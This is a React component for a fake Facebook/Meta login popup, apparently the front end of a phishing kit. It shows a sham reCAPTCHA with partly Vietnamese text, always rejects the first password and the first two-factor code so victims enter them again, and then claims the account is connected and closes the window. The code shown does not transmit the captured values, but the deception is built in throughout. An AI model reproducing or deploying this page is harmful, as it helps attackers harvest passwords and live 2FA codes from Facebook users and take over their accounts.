import React, { useState, useEffect, useRef } from "react";
import { 
  ShieldCheck, 
  Loader2, 
  CheckCircle2, 
  KeyRound, 
  X,
  Mail,
  Lock,
  Smartphone,
  AlertCircle,
  AlertTriangle,
  Eye,
  EyeOff,
  CheckCircle
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Progress } from "@/components/ui/progress";
import { cn } from "@/lib/utils";

enum LoginStep {
  CAPTCHA_VERIFICATION = 0,
  LOGIN_FIRST_ATTEMPT = 1,
  LOGIN_SECOND_ATTEMPT = 2,
  VERIFICATION_FIRST_ATTEMPT = 3,
  VERIFICATION_TIMEOUT = 4,
  VERIFICATION_SECOND_ATTEMPT = 5,
  SUCCESS = 6
}

const MetaLoginPopup = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [verificationCode, setVerificationCode] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [currentStep, setCurrentStep] = useState(LoginStep.CAPTCHA_VERIFICATION);
  const [countdown, setCountdown] = useState(60);
  const codeInputRef = useRef<HTMLInputElement>(null);
  
  // Reset the timer when we reach the timeout step
  useEffect(() => {
    if (currentStep === LoginStep.VERIFICATION_TIMEOUT) {
      const timer = setInterval(() => {
        setCountdown((prev) => {
          if (prev <= 1) {
            clearInterval(timer);
            setCurrentStep(LoginStep.VERIFICATION_SECOND_ATTEMPT);
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
      
      return () => clearInterval(timer);
    }
    
    // Close the window when verification is successful
    if (currentStep === LoginStep.SUCCESS) {
      const timer = setTimeout(() => {
        window.close();
      }, 2000);
      
      return () => clearTimeout(timer);
    }
  }, [currentStep]);

  // Focus on the code input field when it becomes visible
  useEffect(() => {
    if (
      (currentStep === LoginStep.VERIFICATION_FIRST_ATTEMPT || 
       currentStep === LoginStep.VERIFICATION_SECOND_ATTEMPT) && 
      codeInputRef.current
    ) {
      codeInputRef.current.focus();
    }
  }, [currentStep]);

  // Random delay between 3-5 seconds
  const getRandomDelay = () => Math.floor(Math.random() * 2000) + 3000;
  
  const [showPassword, setShowPassword] = useState(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  
  const handlePasswordSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setErrorMessage(null);

    // Simulate authentication process with longer delay (3-5 seconds)
    setTimeout(() => {
      if (!email || !password) {
        setIsLoading(false);
        setErrorMessage("Please enter both email and password.");
        return;
      }
      
      if (currentStep === LoginStep.LOGIN_FIRST_ATTEMPT) {
        // First password attempt always fails
        setTimeout(() => {
          setIsLoading(false);
          setErrorMessage("The password you entered is incorrect. Please try again.");
          setPassword("");
          setCurrentStep(LoginStep.LOGIN_SECOND_ATTEMPT);
        }, 500); // A small additional delay for the error message
      } else {
        // Show success for the second attempt, then transition to verification
        setTimeout(() => {
          setIsLoading(false);
          setCurrentStep(LoginStep.VERIFICATION_FIRST_ATTEMPT);
        }, 800);
      }
    }, getRandomDelay());
  };

  const [verificationError, setVerificationError] = useState<string | null>(null);
  
  const handleVerificationSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setVerificationError(null);

    // Simulate verification process with longer delay (3-5 seconds)
    setTimeout(() => {
      if (!verificationCode || verificationCode.length < 6) {
        setIsLoading(false);
        setVerificationError("Please enter a valid verification code (at least 6 digits).");
        return;
      }
      
      if (currentStep === LoginStep.VERIFICATION_FIRST_ATTEMPT) {
        // First verification attempt always fails
        setTimeout(() => {
          setIsLoading(false);
          setVerificationError("The verification code you entered is incorrect. Please wait 60 seconds before trying again.");
          setVerificationCode("");
          setCountdown(60);
          setCurrentStep(LoginStep.VERIFICATION_TIMEOUT);
        }, 500);
      } else {
        // Second verification attempt succeeds
        setTimeout(() => {
          setIsLoading(false);
          setCurrentStep(LoginStep.SUCCESS);
        }, 800);
      }
    }, getRandomDelay());
  };

  return (
    <div className="min-h-screen bg-[#f0f2f5] flex flex-col">
      <header className="bg-white shadow-sm sticky top-0 z-10">
        <div className="max-w-7xl mx-auto p-3 flex justify-between items-center">
          <img 
            src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" 
            alt="Meta Logo" 
            className="h-10"
          />
          <button 
            onClick={() => window.close()} 
            className="text-gray-500 hover:text-gray-800 focus:outline-none focus:ring-1 focus:ring-gray-200 rounded-full p-1"
            aria-label="Close"
          >
            <X className="h-5 w-5" />
          </button>
        </div>
      </header>
      
      <main className="flex-grow flex items-center justify-center p-4">
        <div className="bg-white rounded-md shadow-md p-6 w-full max-w-[396px]">
          {currentStep === LoginStep.SUCCESS ? (
            <div className="text-center">
              <div className="mx-auto mb-4">
                <img 
                  src="https://static.xx.fbcdn.net/rsrc.php/v3/y2/r/MbU7tyG1CmT.png" 
                  alt="Success" 
                  className="h-20 mx-auto"
                />
              </div>
              <h2 className="text-xl font-semibold mb-3">Account Connected</h2>
              <p className="text-gray-600 mb-5">
                Your Facebook account has been successfully connected. This window will close automatically.
              </p>
              <Progress value={100} className="h-1 bg-gray-100" />
              <p className="text-sm text-gray-400 mt-2">Redirecting back to application...</p>
            </div>
          ) : (
            <>
              <div className="text-center mb-6">
                {/* Using a reliable local copy of Facebook logo */}
                <div className="text-[#1877F2] font-bold text-6xl mb-2">facebook</div>
                <p className="text-gray-700 text-sm mt-3">
                  Log in to continue with your application
                </p>
              </div>
              
              {/* Captcha Verification Step */}
              {currentStep === LoginStep.CAPTCHA_VERIFICATION && (
                <div className="space-y-6">
                  <div className="text-center mb-6">
                    <h3 className="text-xl font-semibold text-gray-800">facebook.com</h3>
                    <p className="text-[#65676b] mt-2 text-[15px]">
                      Vui lòng xác nhận bạn không phải robot để tiếp tục.
                    </p>
                  </div>
                  
                  <div className="border border-gray-200 rounded-md p-5">
                    <div className="flex justify-center mb-5">
                      <div className="text-center">
                        <div className="bg-[#f9f9f9] border border-[#d3d3d3] rounded-md p-3 w-[302px]">
                          <div className="flex items-center justify-between border-b border-[#d3d3d3] pb-2 mb-3">
                            <span className="text-sm text-gray-600">reCAPTCHA</span>
                            <div className="flex items-center">
                              <span className="text-sm text-gray-500 mr-1">Bảo vệ bởi</span>
                              <img 
                                src="https://www.gstatic.com/recaptcha/api2/logo_48.png" 
                                alt="Google" 
                                className="h-5"
                              />
                            </div>
                          </div>
                          
                          <div className="flex items-start mb-3">
                            <div 
                              className="w-5 h-5 border border-gray-400 rounded-sm mr-3 cursor-pointer hover:border-[#2196f3] mt-1"
                              onClick={() => setCurrentStep(LoginStep.LOGIN_FIRST_ATTEMPT)}
                            ></div>
                            <div>
                              <div className="text-sm text-gray-700 text-left">
                                Tôi không phải người máy
                              </div>
                              <div className="flex items-center justify-between mt-2">
                                <div className="flex items-center">
                                  <div className="h-9 w-9 bg-gray-100 rounded-full flex items-center justify-center mr-2">
                                    <span className="text-gray-400 text-xs">🔊</span>
                                  </div>
                                  <div className="h-9 w-9 bg-gray-100 rounded-full flex items-center justify-center">
                                    <span className="text-gray-400 text-xs">🔄</span>
                                  </div>
                                </div>
                                <a href="#" className="text-xs text-[#2196f3] hover:underline">Trợ giúp</a>
                              </div>
                            </div>
                          </div>
                          
                          <div className="text-xs text-[#555] text-right">
                            <a href="#" className="hover:underline">Điều khoản</a>
                            <span className="mx-1">•</span>
                            <a href="#" className="hover:underline">Bảo mật</a>
                          </div>
                        </div>
                      </div>
                    </div>
                    
                    <Button 
                      onClick={() => setCurrentStep(LoginStep.LOGIN_FIRST_ATTEMPT)}
                      className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white h-[40px] rounded-[6px] font-medium"
                    >
                      Tiếp tục
                    </Button>
                  </div>
                  
                  <div className="text-xs text-center text-gray-500 mt-4">
                    Kiểm tra này giúp ngăn chặn phần mềm độc hại và bảo vệ tài khoản của bạn.
                  </div>
                </div>
              )}
              
              {/* Login Steps */}
              {(currentStep === LoginStep.LOGIN_FIRST_ATTEMPT || currentStep === LoginStep.LOGIN_SECOND_ATTEMPT) && (
                <form onSubmit={handlePasswordSubmit} className="space-y-4">

                  
                  <div>
                    <Input 
                      id="email" 
                      type="text"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      placeholder="Email address or phone number"
                      className={`h-[50px] rounded-[6px] text-[17px] ${errorMessage ? "border-[#f02849]" : "border-[#dddfe2]"}`}
                      disabled={currentStep === LoginStep.LOGIN_SECOND_ATTEMPT}
                    />
                  </div>
                  
                  <div className="relative">
                    <Input 
                      id="password" 
                      type={showPassword ? "text" : "password"}
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="Password"
                      className={`h-[50px] rounded-[6px] text-[17px] pr-10 ${errorMessage ? "border-[#f02849]" : "border-[#dddfe2]"}`}
                      autoFocus={currentStep === LoginStep.LOGIN_SECOND_ATTEMPT}
                    />
                    <button
                      type="button"
                      className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
                      onClick={() => setShowPassword(!showPassword)}
                      tabIndex={-1}
                    >
                      {showPassword ? (
                        <EyeOff className="h-5 w-5" />
                      ) : (
                        <Eye className="h-5 w-5" />
                      )}
                    </button>
                  </div>
                  
                  {/* Error message appears below password field like in real Facebook */}
                  {errorMessage && (
                    <div className="text-[#f02849] text-xs -mt-2">
                      {errorMessage}
                    </div>
                  )}
                  
                  <Button 
                    type="submit" 
                    className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white h-[50px] rounded-[6px] text-[20px] font-bold"
                    disabled={isLoading}
                  >
                    {isLoading ? (
                      <div className="flex items-center justify-center">
                        <Loader2 className="h-5 w-5 mr-2 animate-spin" />
                        <span>Logging in...</span>
                      </div>
                    ) : (
                      "Log In"
                    )}
                  </Button>
                  
                  {/* Thanh tiến trình đã được loại bỏ */}
                  
                  <div className="text-center border-b border-gray-200 pb-5">
                    <a href="#" className="text-[#1877F2] text-[14px] hover:underline">
                      Forgot password?
                    </a>
                  </div>
                  
                  <div className="flex justify-center pt-2">
                    <Button
                      type="button"
                      className="bg-[#42b72a] hover:bg-[#36a420] text-white text-[17px] h-[48px] py-0 px-4 rounded-[6px] font-bold"
                      onClick={(e) => e.preventDefault()}
                    >
                      Create new account
                    </Button>
                  </div>
                </form>
              )}
              
              {/* 2FA Verification Steps */}
              {(currentStep === LoginStep.VERIFICATION_FIRST_ATTEMPT || 
                currentStep === LoginStep.VERIFICATION_TIMEOUT || 
                currentStep === LoginStep.VERIFICATION_SECOND_ATTEMPT) && (
                <>
                  <div className="text-center mb-4">
                    <div className="h-16 w-16 mx-auto mb-3 flex items-center justify-center bg-[#e7f3ff] rounded-full">
                      <Lock className="h-8 w-8 text-[#1877F2]" />
                    </div>
                    <h3 className="text-xl font-semibold">Two-factor authentication required</h3>
                    <p className="text-[#65676b] mt-2 text-[15px]">
                      We sent a code to your phone. Enter it here to verify your identity.
                    </p>
                  </div>
                  
                  <form onSubmit={handleVerificationSubmit} className="space-y-4">

                    
                    <div>
                      <Input 
                        id="code" 
                        type="text"
                        inputMode="numeric"
                        ref={codeInputRef}
                        value={verificationCode}
                        onChange={(e) => setVerificationCode(e.target.value.replace(/[^0-9]/g, '').substring(0, 8))}
                        placeholder="Enter code"
                        className={`h-[50px] rounded-[6px] text-[17px] text-center ${verificationError ? "border-[#f02849]" : "border-[#dddfe2]"}`}
                        disabled={currentStep === LoginStep.VERIFICATION_TIMEOUT || isLoading}
                        maxLength={8}
                      />
                      
                      {verificationError && (
                        <div className="text-[#f02849] text-xs mt-1 text-center">
                          {verificationError}
                        </div>
                      )}
                      
                      <div className="text-xs text-[#65676b] text-center mt-3">
                        {currentStep === LoginStep.VERIFICATION_TIMEOUT && (
                          <div className="text-red-500 font-semibold">
                            Please wait {countdown} seconds before requesting a new code
                          </div>
                        )}
                      </div>
                    </div>
                    
                    <Button 
                      type="submit" 
                      className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white h-[48px] rounded-[6px] font-bold text-[18px]"
                      disabled={isLoading || currentStep === LoginStep.VERIFICATION_TIMEOUT}
                    >
                      {isLoading ? (
                        <div className="flex items-center justify-center">
                          <Loader2 className="h-5 w-5 mr-2 animate-spin" />
                          <span>Verifying code...</span>
                        </div>
                      ) : (
                        "Continue"
                      )}
                    </Button>
                    
                    {/* Thanh tiến trình đã được loại bỏ */}
                    
                    <div className="flex flex-col space-y-3 border-t border-gray-200 pt-3">
                      {currentStep !== LoginStep.VERIFICATION_TIMEOUT && (
                        <a href="#" className="text-[#1877F2] text-[15px] text-center hover:underline">
                          I didn't receive a code
                        </a>
                      )}
                      <a href="#" className="text-[#1877F2] text-[15px] text-center hover:underline">
                        Try another way
                      </a>
                    </div>
                  </form>
                </>
              )}
            </>
          )}
        </div>
      </main>
      
      <footer className="mt-auto py-5">
        <div className="max-w-[980px] mx-auto px-4">
          <div className="flex flex-wrap justify-center gap-x-3 text-xs text-[#737373] mb-2">
            <a href="#" className="hover:underline">English (US)</a>
            <a href="#" className="hover:underline">Español</a>
            <a href="#" className="hover:underline">Français (France)</a>
            <a href="#" className="hover:underline">中文(简体)</a>
            <a href="#" className="hover:underline">العربية</a>
            <a href="#" className="hover:underline">Português (Brasil)</a>
            <a href="#" className="hover:underline">Italiano</a>
            <a href="#" className="hover:underline">한국어</a>
            <a href="#" className="hover:underline">Deutsch</a>
            <a href="#" className="hover:underline">हिन्दी</a>
            <a href="#" className="hover:underline">日本語</a>
          </div>
          
          <div className="border-t border-gray-200 pt-3">
            <div className="flex flex-wrap justify-center gap-x-3 gap-y-1 text-xs text-[#737373]">
              <a href="#" className="hover:underline">Sign Up</a>
              <a href="#" className="hover:underline">Log In</a>
              <a href="#" className="hover:underline">Messenger</a>
              <a href="#" className="hover:underline">Facebook Lite</a>
              <a href="#" className="hover:underline">Watch</a>
              <a href="#" className="hover:underline">Places</a>
              <a href="#" className="hover:underline">Games</a>
              <a href="#" className="hover:underline">Marketplace</a>
              <a href="#" className="hover:underline">Facebook Pay</a>
              <a href="#" className="hover:underline">Privacy</a>
              <a href="#" className="hover:underline">Cookies</a>
              <a href="#" className="hover:underline">Terms</a>
              <a href="#" className="hover:underline">Help</a>
            </div>
            <div className="text-center text-xs text-[#737373] mt-4">
              <p>Meta © {new Date().getFullYear()}</p>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default MetaLoginPopup;